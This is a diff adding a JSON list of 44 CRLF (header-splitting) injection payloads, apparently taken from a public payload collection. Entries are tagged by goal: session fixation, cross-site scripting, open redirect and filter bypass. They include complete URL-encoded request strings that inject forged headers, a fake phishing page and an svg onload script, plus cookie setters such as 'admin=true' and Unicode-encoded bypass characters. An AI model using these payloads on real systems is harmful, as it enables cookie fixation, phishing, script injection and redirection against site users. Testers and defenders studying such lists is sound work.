@@ -1,0 +1,398 @@
+[
+  {
+    "id": "crlf-injection-1",
+    "title": "Methodology",
+    "payload": "CR",
+    "context": "Methodology",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-2",
+    "title": "Methodology",
+    "payload": "LF",
+    "context": "Methodology",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-3",
+    "title": "Session Fixation",
+    "payload": "HTTP/1.1 200 OK",
+    "context": "Session Fixation",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-4",
+    "title": "Session Fixation",
+    "payload": "Content-Type: text/html",
+    "context": "Session Fixation",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-5",
+    "title": "Session Fixation",
+    "payload": "Set-Cookie: sessionid=abc123",
+    "context": "Session Fixation",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-6",
+    "title": "Session Fixation",
+    "payload": "Set-Cookie: sessionid=value",
+    "context": "Session Fixation",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-7",
+    "title": "Session Fixation",
+    "payload": "Set-Cookie: admin=true",
+    "context": "Session Fixation",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-8",
+    "title": "Cross Site Scripting",
+    "payload": "http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-9",
+    "title": "Cross Site Scripting",
+    "payload": "Set-Cookie:en",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-10",
+    "title": "Cross Site Scripting",
+    "payload": "Content-Length: 0",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-11",
+    "title": "Cross Site Scripting",
+    "payload": "Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-12",
+    "title": "Cross Site Scripting",
+    "payload": "Content-Length: 34",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-13",
+    "title": "Cross Site Scripting",
+    "payload": "<html>You have been Phished</html>",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-14",
+    "title": "Cross Site Scripting",
+    "payload": "http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-15",
+    "title": "Cross Site Scripting",
+    "payload": "Date: Tue, 20 Dec 2016 14:34:03 GMT",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-16",
+    "title": "Cross Site Scripting",
+    "payload": "Content-Type: text/html; charset=utf-8",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-17",
+    "title": "Cross Site Scripting",
+    "payload": "Content-Length: 22907",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-18",
+    "title": "Cross Site Scripting",
+    "payload": "Connection: close",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-19",
+    "title": "Cross Site Scripting",
+    "payload": "X-Frame-Options: SAMEORIGIN",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-20",
+    "title": "Cross Site Scripting",
+    "payload": "Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-21",
+    "title": "Cross Site Scripting",
+    "payload": "ETag: \"842fe-597b-54415a5c97a80\"",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-22",
+    "title": "Cross Site Scripting",
+    "payload": "Vary: Accept-Encoding",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-23",
+    "title": "Cross Site Scripting",
+    "payload": "X-UA-Compatible: IE=edge",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-24",
+    "title": "Cross Site Scripting",
+    "payload": "Server: NetDNA-cache/2.2",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-25",
+    "title": "Cross Site Scripting",
+    "payload": "Link: https://example.com/[INJECTION STARTS HERE]",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-26",
+    "title": "Cross Site Scripting",
+    "payload": "Content-Length:35",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-27",
+    "title": "Cross Site Scripting",
+    "payload": "X-XSS-Protection:0",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-28",
+    "title": "Cross Site Scripting",
+    "payload": "23",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-29",
+    "title": "Cross Site Scripting",
+    "payload": "<svg onload=alert(document.domain)>",
+    "context": "Cross Site Scripting",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-30",
+    "title": "Open Redirect",
+    "payload": "%0d%0aLocation:%20http://myweb.com",
+    "context": "Open Redirect",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-31",
+    "title": "Filter Bypass",
+    "payload": "嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾",
+    "context": "Filter Bypass",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-32",
+    "title": "Filter Bypass",
+    "payload": "%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE",
+    "context": "Filter Bypass",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-33",
+    "title": "Filter Bypass",
+    "payload": "%E5%98%8A",
+    "context": "Filter Bypass",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-34",
+    "title": "Filter Bypass",
+    "payload": "\\u560a",
+    "context": "Filter Bypass",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-35",
+    "title": "Filter Bypass",
+    "payload": "%0A",
+    "context": "Filter Bypass",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-36",
+    "title": "Filter Bypass",
+    "payload": "%E5%98%8D",
+    "context": "Filter Bypass",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-37",
+    "title": "Filter Bypass",
+    "payload": "\\u560d",
+    "context": "Filter Bypass",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-38",
+    "title": "Filter Bypass",
+    "payload": "%0D",
+    "context": "Filter Bypass",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-39",
+    "title": "Filter Bypass",
+    "payload": "%E5%98%BE",
+    "context": "Filter Bypass",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-40",
+    "title": "Filter Bypass",
+    "payload": "\\u563e",
+    "context": "Filter Bypass",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-41",
+    "title": "Filter Bypass",
+    "payload": "%3E",
+    "context": "Filter Bypass",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-42",
+    "title": "Filter Bypass",
+    "payload": "%E5%98%BC",
+    "context": "Filter Bypass",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-43",
+    "title": "Filter Bypass",
+    "payload": "\\u563c",
+    "context": "Filter Bypass",
+    "tags": [
+      "crlf-injection"
+    ]
+  },
+  {
+    "id": "crlf-injection-44",
+    "title": "Filter Bypass",
+    "payload": "%3C",
+    "context": "Filter Bypass",
+    "tags": [
+      "crlf-injection"
+    ]
+  }
+]
